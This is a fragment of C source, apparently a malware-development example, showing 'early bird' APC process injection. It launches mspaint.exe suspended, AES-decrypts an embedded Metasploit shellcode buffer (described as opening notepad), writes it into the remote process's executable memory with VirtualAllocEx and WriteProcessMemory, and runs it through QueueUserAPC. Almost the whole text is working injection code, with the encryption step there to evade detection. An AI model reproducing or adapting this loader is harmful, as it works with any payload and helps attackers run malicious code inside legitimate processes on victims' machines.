...
// 64-bit shellcode to display notepad, generated using Metasploit on Kali Linux
...
unsigned int payload_length = sizeof(shellcodePayload);
...
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	...
	CreateProcessA(0, "mspaint.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);

	//-- [Optional] Add decryption code or function call if payload is encrypted
	AESDecrypt((char *) shellcodePayload, payload_length, encryption_key, sizeof(encryption_key));
	
	//-- Allocate memory for payload and copy shellcode to it
	pAllocmem = VirtualAllocEx(pi.hProcess, NULL, payload_length, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(pi.hProcess, pAllocmem, (PVOID) shellcodePayload, (SIZE_T) payload_length, (SIZE_T *) NULL);
	
	QueueUserAPC((PAPCFUNC)pAllocmem, pi.hThread, NULL);

	//printf("pload = %p ; remote code = %p\nHit Enter to Continue!\n", shellcodePayload, pAllocmem);
	//getchar();
